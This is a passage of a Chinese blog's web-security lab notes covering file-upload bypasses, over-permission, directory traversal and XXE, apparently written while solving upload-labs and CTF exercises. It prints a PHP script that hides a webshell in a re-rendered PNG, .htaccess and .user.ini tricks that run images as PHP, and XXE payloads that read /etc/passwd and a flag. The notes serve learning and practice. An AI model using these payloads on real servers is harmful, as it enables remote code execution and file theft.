+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	运行成功后将 1.png 上传（正好试试upload-labs的Pass-17），上传成功后下载图片马到本地，查看在图片中插入的代码为<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code>，看这样子挺眼熟，可以用来执行 system(‘’)命令</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-03.jpg" alt="fileup-03"></p>
+<p>利用文件包含漏洞输入文件的路径后，GET传参 <code>0=system</code>，然后POST传参 <code>1=whoami</code> 即可执行命令</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-02.jpg" alt="fileup-02"></p>
+<h3 id="jpg上传"><a href="#jpg上传" class="headerlink" title="jpg上传"></a>jpg上传</h3><blockquote>
+<p>不是所有的 jpg图片 都能被如下这样处理，可以多尝试一些jpg图片</p>
+</blockquote>
+<p>​	还是国外大牛写的脚本jpg_payload.php，找一个jpg图片，上传至服务器然后再下载到本地保存为<code>1.jpg</code>，用此脚本处理 1.jpg，命令 <code>php jpg_payload.php 1.jpg</code> ，用记事本也可以查看到插入的php代码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-04.jpg" alt="fileup-04"></p>
+<p>将生成的文件上传成功后，再用文件包含访问此文件，本地测试成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-05.jpg" alt="fileup-05"></p>
+<p>例题：</p>
+<p>upload-labs Pass-17</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-5">upload-labs之pass 16详细分析 </a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Yang1k/upload-labs-Pass16">Yang1k&#x2F;upload-labs-Pass16</a></p>
+<h2 id="htaccess配置文件绕过"><a href="#htaccess配置文件绕过" class="headerlink" title=".htaccess配置文件绕过"></a>.htaccess配置文件绕过</h2><blockquote>
+<p>只能在 Apache 服务器中起作用<br>在 httpd.conf 中启用 AllowOverride</p>
+</blockquote>
+<p>​	Apache下的一个配置文件，主要负责相关目录下的网页配置，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">//在当前目录下，如果匹配到1.jpg文件，则被解析成PHP代码执行</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="user-ini配置文件绕过"><a href="#user-ini配置文件绕过" class="headerlink" title=".user.ini配置文件绕过"></a>.user.ini配置文件绕过</h2><blockquote>
+<p>服务器脚本语言为 PHP<br>服务器使用CGI FastCGI模式<br>上传目录下要有可执行的 PHP 文件</p>
+</blockquote>
+<p>​	用户自定义的php.ini(php默认的配置文件)，通常构造后门和隐藏后门</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.jpg					<span class="comment">//表示加载第一个PHP代码之 前 先配置所指示的文件</span></span><br><span class="line">auto_append_file = <span class="number">1</span>.jpg					<span class="comment">//表示加载第一个PHP代码之 后 先配置所指示的文件	</span></span><br></pre></td></tr></table></figure>
+
+<p>​	上传完 <code>.user.ini</code> 后再上传图片马，连接的时候输入的是 上传目录下的 PHP文件(不是图片马)，因为上面的代码相当于执行了 include()函数，将我们上传的图片马包含进去了</p>
+<h1 id="Over-Permisson"><a href="#Over-Permisson" class="headerlink" title="Over Permisson"></a>Over Permisson</h1><blockquote>
+<p>​	如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 当前用户的权限 进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞</p>
+<p>常见越权漏洞：GET、POST传参、cookie……</p>
+</blockquote>
+<p><strong>水平越权：</strong></p>
+<p>指 攻击者 尝试访问与他拥有 相同权限 的用户资源。主要看 A用户 的操作能不能影响到 用户B</p>
+<p>​	先登录 lucy 的账户，查看个人信息后发现其是通过 GET传参 进行查找个人信息的(没有进行任何限制)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/over-01.jpg" alt="over-01"></p>
+<p>​	可以试着修改 username 的值，成功在未登录 lili账号的情况下 查看其个人信息，实现水平越权</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/over-02.png" alt="over-02"></p>
+<p><strong>部分源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_op_login</span>(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:op1_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定</span></span><br><span class="line">    <span class="variable">$username</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select * from member where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="variable">$uname</span>=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$sex</span>=<span class="variable">$data</span>[<span class="string">&#x27;sex&#x27;</span>];</span><br><span class="line">        <span class="variable">$phonenum</span>=<span class="variable">$data</span>[<span class="string">&#x27;phonenum&#x27;</span>];</span><br><span class="line">        <span class="variable">$add</span>=<span class="variable">$data</span>[<span class="string">&#x27;address&#x27;</span>];</span><br><span class="line">        <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];…………</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//isset() 函数用于检测变量是否已设置并且非 NULL(\0 ≠ NULL)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>垂直越权：</strong></p>
+<p>攻击者 使用 权限低 的用户访问到 权限高 的用户，比如 普通用户 使用 管理员的功能</p>
+<h1 id="x2F-x2F-目录遍历"><a href="#x2F-x2F-目录遍历" class="headerlink" title="..&#x2F;..&#x2F;(目录遍历)"></a>..&#x2F;..&#x2F;(目录遍历)</h1><blockquote>
+<p>​	在Web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的过滤，则攻击者可能会通过“..&#x2F;”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来。</p>
+</blockquote>
+<p>​	没什么困难，重要的是了解其文件树结构(BP中可以查看)，切到想要的文件目录即可</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><blockquote>
+<p>XXE(xml external entity injection)，xml外部实体注入漏洞。<br>概括一下就是 攻击者 通过向服务器注入 xml实体内容,从而让服务器按照指定的配置进行执行。</p>
+<p>也就是说 服务端 接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致XXE</p>
+</blockquote>
+<p><strong>XML</strong></p>
+<p>​	eXtensible Markup Language，可扩展的标记语言(很像HTML)，无固定标签。用于 存储 和 传输 信息，经常被用作 配置文件。有且只有一个根元素、大小写敏感、属性值内容要用 双引号 括起…… </p>
+<p>​	内部DTD</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;XXE&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	PHP伪协议也同样适用(外部DTD)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">name</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第一部分：xml申明信息，描述其 版本 和 编码方式</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二部分：DTD</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[		&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>	</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span>		要求元素下的内容只能是文本，不能出现标签</span></span><br><span class="line"><span class="meta">  	<span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  	<span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  	<span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span>		&lt;!--内部元素声明--&gt;</span></span><br><span class="line"><span class="meta"> 	</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">entity-name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span>	&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第三部分：文档元素</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>		</span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD</strong></p>
+<p>​	Document Type Definition(文档类型定义)，约束 xml 的文档格式，分为 外部DTD和内部DTD</p>
+<p><strong>内部DTD定义</strong></p>
+<p>​	<code>&lt;!DCOTYPE 根元素 [元素声明]&gt;</code> ：声明 <strong>根元素</strong> 下的元素(声明之后 根元素 下必须包含提到的元素)</p>
+<p>​	<code>	&lt;!ELEMENT 元素名 (子元素……)&gt;</code> ：声明 <strong>元素</strong> 下的子元素</p>
+<p>​	<code>	&lt;!ATTLIST 元素名 属性名 属性类型 默认值&gt;</code> ：声明 元素 的属性</p>
+<ul>
+<li>属性类型：CDATA，表示字符数据(character data)</li>
+<li>默认值：#REQUIRED：必须出现，#IMPLIED：不是必要的</li>
+</ul>
+<p>​	+：表示出现至少一次、？：至多出现一次、*：可以出现任意次</p>
+<p><strong>外部DTD定义</strong></p>
+<p>​	定义一个 DTD文件，<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD文件名&quot;&gt;</code> 将其引入即可</p>
+<p><strong>[NCTF2019]Fake XML cookbook</strong>：</p>
+<p>​	查看源码后，可用看到这是xml，且有三个xml标签user、username、password</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/XXE-01.jpg"></p>
+<p>用XXE读取flag</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">name</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/005.jpg" data-sites="twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/17/201%E2%80%94Metasploit%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/006.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Metasploit</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/08/100%E2%80%94xss-labs/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/004.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">xss-labs笔记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/11/21/002&102%E2%80%94PHP(%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB)/" title="PHP-杂七杂八"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/007.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-21</div><div class="title">PHP-杂七杂八</div></div></a></div><div><a href="/2022/10/08/100%E2%80%94xss-labs/" title="xss-labs笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/004.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-08</div><div class="title">xss-labs笔记</div></div></a></div><div><a href="/2022/12/18/103%E2%80%94SSTI%E6%BC%8F%E6%B4%9E-%E5%85%A5%E9%97%A8/" title="SSTI漏洞(模板注入)-入门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/008.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-18</div><div class="title">SSTI漏洞(模板注入)-入门</div></div></a></div><div><a href="/2023/01/17/104%E2%80%94%E4%BC%B0%E8%AE%A1%E4%BB%A5%E5%90%8E%E4%B8%8D%E4%BC%9A%E9%81%87%E5%88%B0%E6%BC%8F%E6%B4%9E/" title="估计以后不会遇到的漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/009.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-17</div><div class="title">估计以后不会遇到的漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Nik41d0</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Nik41d0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Nik41d0" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1581283149&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>声明</span></div><div class="announcement_content">技术很菜，还有点中二<br><b>QQ：1581283149</b></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">2.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">3.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsafe-file-download"><span class="toc-number">4.</span> <span class="toc-text">Unsafe file download</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsafe-file-upload-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.</span> <span class="toc-text">Unsafe file upload(文件上传)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">5.1.</span> <span class="toc-text">图片马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">5.2.</span> <span class="toc-text">图片二次渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#png%E4%B8%8A%E4%BC%A0-IDAT"><span class="toc-number">5.2.1.</span> <span class="toc-text">png上传(IDAT)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jpg%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.2.2.</span> <span class="toc-text">jpg上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.</span> <span class="toc-text">.htaccess配置文件绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.</span> <span class="toc-text">.user.ini配置文件绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Over-Permisson"><span class="toc-number">6.</span> <span class="toc-text">Over Permisson</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x2F-x2F-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">7.</span> <span class="toc-text">..&#x2F;..&#x2F;(目录遍历)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">8.</span> <span class="toc-text">XXE</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" 